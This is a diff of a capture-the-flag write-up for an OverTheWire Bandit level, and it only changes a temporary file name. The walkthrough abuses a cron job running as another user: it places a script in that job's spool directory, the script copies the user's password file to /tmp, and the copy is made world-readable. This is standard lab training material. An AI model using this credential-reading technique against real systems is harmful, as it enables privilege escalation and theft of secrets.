@@ -11,9 +11,9 @@ cat /usr/bin/cronjob_bandit24.sh
 ```
 We need to create a script in the specified directory. It will be executed as the bandit24 user:
 ```
-echo 'cat /etc/bandit_pass/bandit24 > /tmp/...shyhat_bandit24_pass.txt; chmod 777 /tmp/...shyhat_bandit24_pass.txt' > /var/spool/bandit24/foo/shyhat.sh; chmod +x /var/spool/bandit24/foo/shyhat.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/shyhat_bandit24_pass.txt; chmod 777 /tmp/shyhat_bandit24_pass.txt' > /var/spool/bandit24/foo/shyhat.sh; chmod +x /var/spool/bandit24/foo/shyhat.sh
 ```
 Then we read the file for the password
 ```
-cat /tmp/...shyhat_bandit24_pass.txt
+cat /tmp/shyhat_bandit24_pass.txt
 ```
